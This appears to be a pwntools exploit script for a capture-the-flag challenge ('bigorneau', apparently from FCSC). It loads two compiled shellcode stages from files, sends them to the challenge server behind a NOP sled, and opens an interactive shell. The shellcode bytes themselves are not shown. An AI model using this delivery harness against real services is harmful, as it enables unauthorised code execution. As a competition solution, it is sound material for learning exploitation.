from pwn import *
from time import sleep

context.terminal = ["gnome-terminal", "--window", "-x", "sh", "-c"]

# DEBUG = True
DEBUG = False

shellcode_stage0 = b""
shellcode_stage1 = b""
try:
    f = open("./build/stage0.bin", "rb")
    shellcode_stage0 = f.read()
    f.close()
    f = open("./build/stage1.bin", "rb")
    shellcode_stage1 = f.read()
    f.close()
except Exception:
    print("Please compile shellcodes first")
    exit(-1)

if DEBUG:
    p = process(["python", "bigorneau.py"])
    # gdb.attach(p, gdbscript="set follow-fork-mode child\nc\n")
else:
    p = remote("chal.fcsc.fr", 2102)

sleep(1)

p.sendline(shellcode_stage0.hex().encode())
padded_shellcode_stage1 = b"\x90" * 0x80 + shellcode_stage1
p.send(padded_shellcode_stage1)

p.interactive()
